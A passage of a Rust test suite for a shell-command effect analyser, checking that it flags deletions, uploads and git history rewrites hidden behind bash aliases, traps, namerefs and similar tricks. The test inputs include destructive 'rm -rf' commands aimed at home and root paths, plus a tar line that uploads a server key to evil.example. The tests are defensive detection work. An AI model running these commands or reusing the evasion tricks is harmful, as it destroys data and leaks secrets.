        .find(|effect| effect.operation.0 == "git.reset_request")
        .unwrap();
    assert_eq!(reset.attributes.get("hard"), Some(&AttrValue::Bool(true)));
    assert_eq!(
        plan.coverage.level(&Domain::new("git")),
        Some(CoverageLevel::Full)
    );
}

#[test]
fn clone_destination_precedes_host_git_alias_lookup() {
    let source = "git clone https://example.test/project.git build && git -C build filter-repo --force --path secrets.txt --invert-paths";
    let plan = Engine::new()
        .with_causality_detail(true)
        .with_resolver(Box::new(Sources(HashMap::from([(
            "workspace/project/build/.git/config".to_string(),
            "[alias]\nfilter-repo = log\n".to_string(),
        )]))))
        .analyze(&Subject::Shell {
            source: source.to_string(),
            cwd: Some("/workspace/project".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    let rewrite = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.history_rewrite_request")
        .unwrap_or_else(|| panic!("{source}: {:?}", plan.effects));
    assert_eq!(
        rewrite.attributes.get("force"),
        Some(&AttrValue::Bool(true))
    );
    assert!(matches!(
        &rewrite.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::GitRepository {
                worktree: Some(worktree),
                ..
            }
        } if matches!(worktree.as_ref(), ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path == "/workspace/project/build")
    ));
}

fn has_delete(plan: &Plan, want: &str) -> bool {
    delete_resources(plan).iter().any(|r| {
        matches!(
            r,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == want
        )
    })
}

#[test]
fn parameter_error_expansion_never_substitutes_its_message() {
    // An unset or empty value aborts the command; it never expands to empty.
    for source in [
        r#"X=; rm -rf "${X:?}"/victim"#,
        r#"unset X; rm -rf "${X?}"/victim"#,
        r#"X=; rm -rf "${X:?/victim}""#,
    ] {
        let plan = shell(source, None);
        assert!(
            !has_delete(&plan, "/victim"),
            "{source}: {:?}",
            plan.effects
        );
    }
    let plan = shell(r#"X=/tmp; rm -rf "${X:?}"/victim"#, None);
    assert!(has_delete(&plan, "/tmp/victim"));
    // A rejected value is never claimed to stop the shell: variables the
    // evaluator does not track (dynamic ones, `cd`, traps, aliases, `case`
    // side effects) may be set by then, so later commands keep their effects.
    for source in [
        r#"X=; rm -rf /victim "${X:?}""#,
        r#"arr=(); rm -rf /victim "${arr[0]:?}""#,
        r#"X=; ref=X; rm -rf /victim "${!ref:?}""#,
        r#"X=; rm -rf "${X:?}"; rm -rf /victim"#,
        r#"rm -rf /victim "${NOT_SET_HERE:?}""#,
        r#"set -- $(echo a b); rm -rf /victim "${2:?}""#,
        r#"f(){ : "${2:?}"; }; f $(echo a b); rm -rf /victim"#,
        r#"X=; let X=1; : "${X:?}"; rm -rf /victim"#,
        r#"RANDOM=; : "${RANDOM:?}"; rm -rf /victim"#,
        r#"OLDPWD=; cd /tmp; : "${OLDPWD:?}"; rm -rf /victim"#,
        r#"X=; trap "X=a" DEBUG; : "${X:?}"; rm -rf /victim"#,
        r#"X=; case "${X:=a}" in *) ;; esac; : "${X:?}"; rm -rf /victim"#,
    ] {
        assert!(has_delete(&shell(source, None), "/victim"), "{source}");
    }
}

#[test]
fn arithmetic_constants_read_their_base() {
    for (source, path) in [
        (r#"rm -rf "/victim$((010))""#, "/victim8"),
        (r#"rm -rf "/victim$((0x1F))""#, "/victim31"),
        (r#"rm -rf "/victim$((2#101))""#, "/victim5"),
        (r#"rm -rf "/victim$((64#_))""#, "/victim63"),
        (r#"N=010; rm -rf "/victim$((N))""#, "/victim8"),
    ] {
        assert!(has_delete(&shell(source, None), path), "{source}");
    }
    // A digit outside its base is an error, never a decimal reading.
    assert!(!has_delete(
        &shell(r#"rm -rf "/victim$((08))""#, None),
        "/victim8"
    ));
}

#[test]
fn declared_case_attribute_converts_later_assignments() {
    // A function's own `declare` shadows the caller's attribute only for the
    // call; the caller's returns with it.
    for source in [
        r#"declare -l T; T=/VICTIM; rm -rf "$T""#,
        r#"declare -l T; f(){ declare T; }; f; T=/VICTIM; rm -rf "$T""#,
    ] {
        assert!(has_delete(&shell(source, None), "/victim"), "{source}");
    }
    // `+l`, `unset` and a function's `local -l` leave later values as written.
    for source in [
        r#"declare -l T; declare +l T; T=/VICTIM; rm -rf "$T""#,
        r#"declare -l T; unset T; T=/VICTIM; rm -rf "$T""#,
        r#"f(){ local -l T; }; f; T=/VICTIM; rm -rf "$T""#,
        r#"f(){ declare -l T; }; f; T=/VICTIM; rm -rf "$T""#,
    ] {
        assert!(has_delete(&shell(source, None), "/VICTIM"), "{source}");
    }
}

#[test]
fn not_found_handler_runs_only_for_searched_names() {
    let handler = "command_not_found_handle(){ rm -rf /victim; }; ";
    assert!(has_delete(
        &shell(&format!("{handler}missing"), None),
        "/victim"
    ));
    // A binding a guard may have skipped leaves the name searched.
    for guarded in [
        "[ -f a ] && hash -p /bin/true missing; missing",
        "shopt -s expand_aliases; [ -f a ] && alias missing=true\nmissing",
    ] {
        assert!(
            has_delete(&shell(&format!("{handler}{guarded}"), None), "/victim"),
            "{guarded}"
        );
    }
    // A `hash -p` binding and an alias that expands here are never searched.
    for resolved in [
        "./missing",
        "hash -p /bin/true missing; missing",
        "shopt -s expand_aliases; alias missing=true\nmissing",
    ] {
        assert!(
            !has_delete(&shell(&format!("{handler}{resolved}"), None), "/victim"),
            "{resolved}"
        );
    }
}

#[test]
fn shell_pid_names_its_own_process_entry_only_in_the_shell_itself() {
    for (source, own) in [
        ("rm -rf /proc/$$/cwd/victim", true),
        ("rm -rf /proc/$BASHPID/cwd/victim", true),
        ("(rm -rf /proc/$BASHPID/cwd/victim)", true),
        ("f(){ rm -rf /proc/$$/cwd/victim; }; f", true),
        // A subshell and a pipeline stage keep the parent shell's `$$`.
        ("(rm -rf /proc/$$/cwd/victim)", false),
        ("echo | rm -rf /proc/$$/cwd/victim", false),
        ("rm -rf /proc/$$/cwd/victim &", false),
    ] {
        assert_eq!(
            has_delete(&shell(source, None), "/proc/self/cwd/victim"),
            own,
            "{source}"
        );
    }
    // The shell's environment and executable differ from its command's.
    assert!(!has_delete(
        &shell("rm -rf /proc/$$/environ", None),
        "/proc/self/environ"
    ));
}

#[test]
fn function_call_redirections_are_opened_once_around_the_body() {
    // A nested call with its own redirection leaves the outer one's intact.
    for source in [
        "f(){ echo hi; }; f >/tmp/out",
        "f(){ echo hi; }; g(){ f >/tmp/inner; echo y; }; g >/tmp/out",
    ] {
        let plan = shell(source, None);
        let writes = plan
            .effects
            .iter()
            .filter(|effect| {
                effect.operation.0 == "filesystem.write"
                    && matches!(&effect.resource, ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path },
                    } if path == "/tmp/out")
            })
            .count();
        assert_eq!(writes, 1, "{source}: {:?}", plan.effects);
    }
}

#[test]
fn unsetting_an_array_element_leaves_the_array_unknown() {
    // Element 0 is gone, so bash expands the default: `/etc`, not `build`.
    let plan = shell(
        r#"arr=(/build); unset "arr[0]"; rm -rf "${arr:-/etc}""#,
        None,
    );
    let deletes = delete_resources(&plan);
    assert!(
        !deletes.is_empty()
            && deletes
                .iter()
                .all(|resource| !matches!(resource, ResourceExpr::Concrete { .. })),
        "{deletes:?}"
    );
}

#[test]
fn listed_entry_names_join_only_under_their_directory() {
    let deletes = |source: &str| {
        shell(source, Some("/work"))
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .map(|effect| format!("{:?}", effect.resource))
            .collect::<Vec<_>>()
    };
    let joined = deletes("ls -A /home/u | xargs -I{} rm -rf /home/u/{}");
    for name in ["/home/u/*", "/home/u/.*"] {
        assert!(
            joined
                .iter()
                .any(|resource| resource.contains(&format!("\"{name}\""))),
            "{joined:?}"
        );
    }
    // A bare name is relative to the cwd, and another prefix names entries
    // that need not exist; neither is an entry of the listed directory.
    for source in [
        "ls -A /home/u | xargs rm -rf",
        "ls -A /home/u | xargs -I{} rm -rf {}",
        "ls -A /home/u | xargs -I{} rm -rf /tmp/{}",
        "ls -l /home/u | xargs -I{} rm -rf /home/u/{}",
    ] {
        let resources = deletes(source);
        assert!(
            resources.iter().all(|resource| !resource.contains('*')),
            "{source}: {resources:?}"
        );
    }
}

#[test]
fn brace_group_body_is_walked() {
    let plan = shell("{ rm /data; }", None);
    assert!(has_delete(&plan, "/data"));
}

#[test]
fn subshell_body_is_walked() {
    let plan = shell("(rm /data)", None);
    assert!(has_delete(&plan, "/data"));
}

#[test]
fn subshell_cd_does_not_escape() {
    // The cd inside the subshell must not move cwd for the later command.
    let plan = shell("(cd /srv); rm data", Some("/w"));
    assert!(has_delete(&plan, "/w/data"));
}

#[test]
fn case_arm_effects_surface() {
    let plan = shell(
        "nvm() { case $1 in install) curl -o /tmp/x https://h/f ;; use) true ;; esac; }\nnvm install",
        None,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "case arm should be walked, got {:?}",
        ops(&plan)
    );
}

#[test]
fn if_branch_delete_surfaces() {
    let plan = shell("if [ -f /a ]; then rm /a; fi", None);
    assert!(has_delete(&plan, "/a"));
    // `[` is an effectless builtin: no unmodeled-command noise.
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unmodeled_command")
    );
}

#[test]
fn for_loop_body_delete_surfaces() {
    let plan = shell("for f in a b c; do rm \"$f\"; done", Some("/w"));
    assert!(ops(&plan).contains(&"filesystem.delete"));
}

#[test]
fn for_list_splits_unquoted_variable_expansion() {
    let plan = shell(r#"v="a b"; for f in $v; do rm "$f"; done"#, None);
    assert_eq!(delete_resources(&plan).len(), 2);

    let plan = shell(
        r#"v="a b"; q="c d"; for f in $v "$q"; do rm "$f"; done"#,
        Some("/"),
    );
    let resources = delete_resources(&plan);
    assert_eq!(resources.len(), 3);
    for expected in ["/a", "/b", "/c d"] {
        assert!(resources.iter().any(|resource| matches!(
            resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == expected
        )));
    }

    let plan = shell(
        r#"IFS=:; v="a:b"; q=c; for f in $v "$q"; do rm "$f"; done"#,
        Some("/"),
    );
    assert_eq!(delete_resources(&plan).len(), 2);
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "unsupported_shell_syntax"
            && boundary.class == BoundaryClass::Unsupported
    }));

    for source in [
        r#"v="a b"; a=(c); for f in $v "${a[@]}"; do rm "$f"; done"#,
        r#"v="a b"; f(){ for x in $v "$@"; do rm "$x"; done; }; f c"#,
    ] {
        let plan = shell(source, Some("/"));
        let resources = delete_resources(&plan);
        assert_eq!(resources.len(), 3, "effects: {:?}", plan.effects);
        for expected in ["/a", "/b", "/c"] {
            assert!(resources.iter().any(|resource| matches!(
                resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == expected
            )));
        }
    }
}

#[test]
fn split_declaration_builtin_operands_bind_variables() {
    for builtin in ["local", "declare", "typeset", "readonly"] {
        let plan = shell(&format!("x='{builtin} C=rm'; $x; $C -rf /x"), None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/x"]);
        assert!(matches!(
            delete_resources(&plan).as_slice(),
            [ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            }] if path == "/x"
        ));
    }
    // `-l` and `-u` convert the declared value's case, and holding both
    // attributes converts nothing, so the bound command name follows.
    for builtin in ["local", "declare", "typeset"] {
        for (options, resolved) in [("-l", true), ("-u", false), ("-lu", false), ("+l", false)] {
            let plan = shell(&format!("{builtin} {options} C=RM; $C -rf /x"), None);
            assert_eq!(
                !delete_resources(&plan).is_empty(),
                resolved,
                "{builtin} {options}"
            );
            let unconverted = plan.execution_graph.nodes.iter().any(|node| {
                matches!(&node.subject, Subject::Exec { argv, .. }
                    if argv.first().is_some_and(|head| head == "RM"))
            });
            assert_eq!(unconverted, !resolved, "{builtin} {options}");
        }
    }
}

#[test]
fn declaration_builtin_operands_keep_expanded_order() {
    for builtin in ["local", "declare", "typeset", "readonly"] {
        let plan = shell(&format!("x='C=echo'; {builtin} $x C=rm; $C -rf /x"), None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/x"]);
        assert!(matches!(
            delete_resources(&plan).as_slice(),
            [ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            }] if path == "/x"
        ));

        let plan = shell(&format!("x='C=rm'; {builtin} $x C=echo; $C -rf /x"), None);
        assert!(delete_resources(&plan).is_empty());
        assert!(!plan.execution_graph.nodes.iter().any(|node| {
            matches!(
                &node.subject,
                Subject::Exec { argv, .. } if argv.first().is_some_and(|head| head == "rm")
            )
        }));
    }
}

#[test]
fn elided_head_does_not_become_a_local_operand() {
    let plan = shell_with_env(
        "f(){ E=; $E local C=rm; $local /x; }; f",
        &[("local", "rm")],
    );
    assert_eq!(exec_argv(&plan, "rm"), ["rm", "/x"]);
    assert!(matches!(
        delete_resources(&plan).as_slice(),
        [ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        }] if path == "/x"
    ));
}

#[test]
fn for_loop_glob_preserves_file_pattern() {
    let plan = shell("for f in *.log; do gzip \"$f\"; done", Some("/srv/data"));
    for (operation, expected) in [
        ("filesystem.read", "/srv/data/*.log"),
        ("filesystem.write", "/srv/data/*.log.gz"),
        ("filesystem.delete", "/srv/data/*.log"),
    ] {
        let effect = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == operation)
            .unwrap();
        assert!(matches!(
            &effect.resource,
            ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == expected
        ));
        assert_eq!(
            effect.request_assurance,
            effinterp_proto::RequestAssurance::Conservative
        );
        assert!(effect.condition.is_some());
    }

    let hidden_suffix = shell("for f in *.g[z]; do gzip \"$f\"; done", Some("/srv/data"));
    assert!(
        !hidden_suffix.effects.iter().any(|effect| matches!(
            effect.operation.0.as_str(),
            "filesystem.read" | "filesystem.write" | "filesystem.delete"
        )),
        "{:?}",
        hidden_suffix.effects
    );
    assert!(!hidden_suffix.boundaries.is_empty());
}

#[test]
fn for_loop_literals_preserve_finite_values() {
    let braces = shell("for d in /{etc,var}; do rm -rf $d; done", None);
    assert!(braces.boundaries.is_empty());
    let resources = delete_resources(&braces);
    assert_eq!(resources.len(), 2);
    for expected in ["/etc", "/var"] {
        assert!(resources.iter().any(|resource| matches!(
            resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == expected
        )));
    }

    let plan = shell(
        "for f in first.log second.log; do gzip \"$f\"; done",
        Some("/srv/data"),
    );
    for (operation, expected) in [
        (
            "filesystem.delete",
            ["/srv/data/first.log", "/srv/data/second.log"],
        ),
        (
            "filesystem.write",
            ["/srv/data/first.log.gz", "/srv/data/second.log.gz"],
        ),
    ] {
        let effects: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == operation)
            .collect();
        assert_eq!(effects.len(), expected.len());
        for expected in expected {
            assert!(effects.iter().any(|effect| matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == expected
            )));
        }
        for effect in effects {
            assert_eq!(
                effect.request_assurance,
                effinterp_proto::RequestAssurance::Conservative
            );
            assert!(effect.condition.is_none());
        }
    }

    // An unconditional break reaches only the first literal value.
    let broken = shell(
        "for f in first.log second.log; do gzip \"$f\"; break; done",
        Some("/srv/data"),
    );
    let effect = broken
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(effect.condition.is_none(), "{effect:?}");
    assert!(
        matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/srv/data/first.log")
    );
}

#[test]
fn for_loop_literal_scripts_are_analyzed_as_alternatives() {
    let plan = shell(
        "for f in 'rm /one' 'rm /two'; do sh -c \"$f\"; done",
        Some("/srv/data"),
    );
    let resources = delete_resources(&plan);
    for expected in ["/one", "/two"] {
        assert!(resources.iter().any(|resource| matches!(
            resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == expected
        )));
    }
    assert_eq!(resources.len(), 2, "{resources:#?}");
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unmodeled_command")
    );
}

#[test]
fn for_loop_option_values_are_not_file_operands() {
    let plan = shell(
        "for f in -d safe.gz; do gzip \"$f\"; done",
        Some("/srv/data"),
    );
    let file_effects: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| {
            matches!(
                effect.operation.0.as_str(),
                "filesystem.read" | "filesystem.write" | "filesystem.delete"
            )
        })
        .collect();
    assert!(file_effects.is_empty(), "{file_effects:#?}");
}

#[test]
fn for_loop_literals_expand_inside_words() {
    let plan = shell(
        "for f in first second; do gzip \"prefix-$f.bak\"; done",
        Some("/srv/data"),
    );
    for (operation, expected) in [
        (
            "filesystem.delete",
            ["/srv/data/prefix-first.bak", "/srv/data/prefix-second.bak"],
        ),
        (
            "filesystem.write",
            [
                "/srv/data/prefix-first.bak.gz",
                "/srv/data/prefix-second.bak.gz",
            ],
        ),
    ] {
        let effects: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == operation)
            .collect();
        assert_eq!(effects.len(), expected.len());
        for expected in expected {
            assert!(effects.iter().any(|effect| matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == expected
            )));
        }
    }
}

#[test]
fn for_loop_unbounded_values_stay_unknown() {
    let substitution = shell(
        "for f in $(find . -name '*.log'); do gzip \"$f\"; done",
        Some("/srv/data"),
    );
    assert!(
        delete_resources(&substitution)
            .iter()
            .any(|resource| matches!(resource, ResourceExpr::Unresolved { .. }))
    );
    assert!(
        substitution
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read"
                && matches!(effect.resource, ResourceExpr::Unresolved { .. })
                && effect.request_assurance == effinterp_proto::RequestAssurance::Conservative)
    );
    assert!(
        !substitution
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    assert!(!substitution.boundaries.is_empty());

    let mut source = "for f in".to_string();
    for index in 0..65 {
        source.push_str(&format!(" file{index}"));
    }
    source.push_str("; do gzip \"$f\"; done");
    let over_wide = shell(&source, Some("/srv/data"));
    assert!(
        delete_resources(&over_wide)
            .iter()
            .any(|resource| matches!(resource, ResourceExpr::Unresolved { .. }))
    );
    assert!(!over_wide.boundaries.is_empty());
}

#[test]
fn for_loop_brace_cardinality_and_quoting() {
    {
        let source = "for f in {1..65}; do gzip \"$f\"; done";
        let plan = shell(source, Some("/srv/data"));
        assert!(
            delete_resources(&plan)
                .iter()
                .any(|resource| matches!(resource, ResourceExpr::Unresolved { .. }))
        );
    }

    let quoted = shell(
        "for f in '{one,two}'; do gzip \"$f\"; done",
        Some("/srv/data"),
    );
    assert!(delete_resources(&quoted).iter().any(|resource| matches!(
        resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path == "/srv/data/{one,two}"
    )));
    assert!(quoted.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.write"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/srv/data/{one,two}.gz"
            )
    }));
}

#[test]
fn while_loop_body_delete_surfaces() {
    let plan = shell("while read f; do rm /q; done", None);
    assert!(has_delete(&plan, "/q"));
}

#[test]
fn trap_action_is_analyzed_as_deferred_shell() {
    // The deferred command runs when the signal fires; its effects must not be
    // dropped just because `trap` looks like a builtin.
    let plan = shell("trap 'rm -rf ~' EXIT", None);
    assert!(ops(&plan).contains(&"filesystem.delete"));
    // Reset (`-`) and ignore (`''`) carry no deferred command.
    for src in ["trap - EXIT", "trap '' EXIT", "trap"] {
        let plan = shell(src, None);
        assert!(plan.effects.is_empty(), "{src:?} produced effects");
    }
}

#[test]
fn trap_option_terminator_precedes_the_action() {
    let plan = shell("trap -- 'rm -rf ~' EXIT", None);
    assert!(ops(&plan).contains(&"filesystem.delete"));
    assert!(plan.boundaries.is_empty());
}

#[test]
fn alias_expansion_follows_chains_blanks_and_definition_time() {
    for src in [
        "shopt -s expand_aliases\nalias a=b\nalias b='rm -rf /q'\na",
        "shopt -s expand_aliases\nalias run='command '\nalias wipe='rm -rf /q'\nrun wipe",
        "shopt -s expand_aliases\nalias wipe='rm -rf /q'\nf(){ wipe; }\nalias wipe='echo'\nf",
        // A quoted or escaped builtin name still runs the builtin.
        "'shopt' -s expand_aliases\nalias wipe='rm -rf /q'\nwipe",
        "\\shopt -s expand_aliases\nalias wipe='rm -rf /q'\nwipe",
        // Quoting the head word suppresses only alias expansion.
        "shopt -s expand_aliases\nalias rm='echo'\n'rm' -rf /q",
    ] {
        let plan = shell(src, None);
        assert!(has_delete(&plan, "/q"), "{src:?}");
    }
    // A self-referencing alias expands once.
    let plan = shell("shopt -s expand_aliases\nalias rm='rm -f'\nrm /q", None);
    assert!(has_delete(&plan, "/q"));
}

#[test]
fn literal_process_substitution_output_is_sourced_through_its_descriptor() {
    let plan = shell("exec 3< <(printf '%s' 'rm -rf /q'); source /dev/fd/3", None);
    assert!(has_delete(&plan, "/q"));
    // A function named printf is not the builtin, so its bytes are unknown.
    let plan = shell(
        "printf(){ :; }; exec 3< <(printf '%s' 'rm -rf /q'); source /dev/fd/3",
        None,
    );
    assert!(!has_delete(&plan, "/q"));
}

#[test]
fn source_dev_stdin_reads_known_piped_bytes() {
    for src in [
        "echo 'rm -rf /q' | source /dev/stdin",
        "echo 'rm -rf /q' | . /proc/self/fd/0",
        "source /dev/stdin <<< 'rm -rf /q'",
    ] {
        let plan = shell(src, None);
        assert!(has_delete(&plan, "/q"), "{src:?}");
    }
}

#[test]
fn command_prefixed_printf_pipes_its_literal_output() {
    // `command` bypasses the function, so the printf builtin writes the text.
    let plan = shell("printf(){ :; }; command -p printf 'rm -rf /q' | bash", None);
    assert!(has_delete(&plan, "/q"));
    let plan = shell("enable -n printf; command printf 'rm -rf /q' | bash", None);
    assert!(!has_delete(&plan, "/q"));
}

#[test]
fn command_runs_the_hashed_program() {
    let plan = shell("hash -p /bin/rm wipe; command wipe -rf /q", None);
    assert!(has_delete(&plan, "/q"));
    // `-p` searches the default PATH instead of the hash table.
    let plan = shell("hash -p /bin/rm wipe; command -p wipe -rf /q", None);
    assert!(!has_delete(&plan, "/q"));
    // The default PATH also replaces an assigned one, while `command` alone
    // searches the assigned directory.
    for src in [
        "PATH=/tmp command -p rm -rf /q",
        "PATH=/tmp; command -p rm -rf /q",
    ] {
        assert!(has_delete(&shell(src, None), "/q"), "{src}");
    }
    let plan = shell("PATH=/tmp command rm -rf /q", None);
    assert!(!has_delete(&plan, "/q"));
}

#[test]
fn unset_nameref_option_keeps_plain_variables_and_targets() {
    let plan = shell("X=/q; unset -n X; rm -rf \"$X\"", None);
    assert!(has_delete(&plan, "/q"));
    let plan = shell("Y=/q; declare -n R=Y; unset -n R; rm -rf \"$Y\"", None);
    assert!(has_delete(&plan, "/q"));
}

#[test]
fn branch_bound_command_names_run_once_per_path() {
    // Each path's alias, `hash -p` or function binding survives the branch:
    // the later command runs as every one of them, not as the last arm's.
    for src in [
        "if test -e m; then hash -p /bin/rm wipe; else hash -p /bin/echo wipe; fi; wipe -rf /q",
        "shopt -s expand_aliases\nif test -e m; then alias wipe='rm -rf /q'; else alias wipe='echo'; fi\nwipe",
        "test -e m && rm(){ :; }; rm -rf /q",
        "if test -e m; then rm(){ :; }; fi; rm -rf /q",
        "f(){ :; }; if test -e m; then readonly -f f; fi; f(){ rm -rf /q; }; f",
    ] {
        let plan = shell(src, None);
        assert!(has_delete(&plan, "/q"), "{src:?}");
    }
    // Paths that agree keep one binding.
    let plan = shell(
        "if test -e m; then rm(){ :; }; else rm(){ :; }; fi; rm -rf /q",
        None,
    );
    assert!(!has_delete(&plan, "/q"));
}

#[test]
fn case_literal_subject_selects_arms_and_fallthrough() {
    let plan = shell(
        "case x in y) rm -rf /a ;; x|z) rm -rf /b ;& w) rm -rf /c ;; *) rm -rf /d ;; esac",
        None,
    );
    let deletes = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .collect::<Vec<_>>();
    assert!(deletes.iter().all(|effect| effect.condition.is_none()));
    assert!(has_delete(&plan, "/b") && has_delete(&plan, "/c"));
    assert!(!has_delete(&plan, "/a") && !has_delete(&plan, "/d"));
    // `;;&` keeps testing the patterns after the matched arm.
    let plan = shell(
        "case x in x) rm -rf /b ;;& y) rm -rf /a ;; *) rm -rf /d ;; esac",
        None,
    );
    assert!(has_delete(&plan, "/b") && has_delete(&plan, "/d") && !has_delete(&plan, "/a"));
    // A glob pattern other than `*` leaves every arm possible.
    let plan = shell("case x in x*) rm -rf /a ;; esac", None);
    assert!(plan.effects.iter().any(|effect| effect.condition.is_some()));
}

#[test]
fn loop_with_proven_entry_runs_its_body_unconditionally() {
    for (source, conditional) in [
        ("while true; do rm -rf /a; done", false),
        ("until false; do rm -rf /a; done", false),
        ("while :; do rm -rf /a; done", false),
        ("for ((i=0; i<1; i++)); do rm -rf /a; done", false),
        ("for ((;;)); do rm -rf /a; done", false),
        ("for ((i=1;i<1;i++)); do rm -rf /a; done", true),
        ("for ((i=0;i<n;i++)); do rm -rf /a; done", true),
        ("while true; do rm -rf /a; break; done", true),
        ("true() { false; }; while true; do rm -rf /a; done", true),
        ("for ((i=0; é<1; i++)); do rm -rf /a; done", true),
    ] {
        let plan = shell(source, None);
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap_or_else(|| panic!("{source}"));
        assert_eq!(delete.condition.is_some(), conditional, "{source}");
    }
    // A constant condition that never enters the loop runs no body.
    for source in [
        "until true; do rm -rf /a; done",
        "while false; do rm -rf /a; done",
    ] {
        assert!(!has_delete(&shell(source, None), "/a"), "{source}");
    }
}

#[test]
fn literal_output_keeps_nul_bytes_that_bash_input_drops() {
    let plan = shell("printf 'rm -rf /q\\0' | bash", None);
    assert!(has_delete(&plan, "/q"));
    let plan = shell("printf 'echo a\\0rm -rf /q' | bash", None);
    assert!(!has_delete(&plan, "/q"));
    let plan = shell("printf 'rm -rf /\\0q' | sh", None);
    assert!(has_delete(&plan, "/q"));
}

#[test]
fn read_builtin_is_a_variable_write_not_a_command() {
    let plan = shell("while IFS= read -r line; do rm /q; done", None);
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unmodeled_command"
                || b.reason.as_str() == "unsupported_shell_syntax")
    );
    let writes: Vec<_> = plan
        .effects
        .iter()
        .filter(|e| e.operation.0 == "environment.write")
        .collect();
    assert!(matches!(
        &writes[..],
        [e] if matches!(&e.resource, ResourceExpr::Concrete {
            identity: ResourceIdentity::EnvironmentVariable { name }
        } if name == "line")
    ));
    // No filesystem claim: read only consumes stdin.
    assert!(!ops(&plan).contains(&"filesystem.read"));
}

#[test]
fn bare_array_reference_names_the_first_element() {
    // `$f` is `${f[0]}`, and mapfile's array replaces the loop's scalar f.
    let plan = shell(
        "for f in README.md; do mapfile -t f <<< .env; cat \"$f\"; done",
        Some("/workspace/project"),
    );
    let read = |want: &str| {
        plan.effects.iter().any(|e| {
            e.operation.0 == "filesystem.read"
                && matches!(&e.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path } } if path == want)
        })
    };
    assert!(read("/workspace/project/.env"), "{:?}", plan.effects);
    assert!(!read("/workspace/project/README.md"));
}

#[test]
fn export_and_prefix_assignment_resolve_a_nameref_target() {
    // `export REF` marks the target TARGET, not the reference REF.
    let plan = shell("TARGET=v; declare -n REF=TARGET; export REF", None);
    let writes: Vec<&str> = plan
        .effects
        .iter()
        .filter(|e| e.operation.0 == "environment.write")
        .filter_map(|e| match &e.resource {
            ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name },
            } => Some(name.as_str()),
            _ => None,
        })
        .collect();
    assert!(writes.contains(&"TARGET"), "{writes:?}");
    assert!(!writes.contains(&"REF"), "{writes:?}");

    // A prefix assignment through a nameref puts the target in the command
    // environment, so tar reads the remote archive TAR_OPTIONS names.
    let plan = shell(
        "export TAR_OPTIONS=''; typeset -n REF=TAR_OPTIONS; REF='--create --file=evil.example:/archive' tar -- source/server.key",
        Some("/workspace/project"),
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "network.upload"),
        "{:?}",
        plan.effects
    );
}

#[test]
fn read_value_flags_and_bare_read() {
    // -p's prompt is not a variable name; a bare read writes REPLY.
    let plan = shell("read -p 'ok? ' ANSWER", None);
    assert!(plan.effects.iter().any(|e| {
        e.operation.0 == "environment.write"
            && matches!(&e.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name }
            } if name == "ANSWER")
    }));
    assert!(
        !plan
            .effects
            .iter()
            .any(|e| matches!(&e.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name }
            } if name == "ok? "))
    );

    let plan = shell("read", None);
    assert!(
        plan.effects
            .iter()
            .any(|e| matches!(&e.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name }
            } if name == "REPLY"))
    );

    // mapfile's option values are not array names either, and MAPFILE is its
    // default array. An invalid option is a usage error that writes nothing.
    for (source, expected, deletes) in [
        (
            "mapfile -C 'rm -rf /' -c 1 rows <<<'line'",
            Some("rows"),
            true,
        ),
        (
            "readarray -tC 'rm -rf /' -c 1 rows <<<'line'",
            Some("rows"),
            true,
        ),
        ("mapfile -c 1 <<<'line'", Some("MAPFILE"), false),
        ("mapfile -C 'rm -rf /' --bad rows <<<'line'", None, false),
    ] {
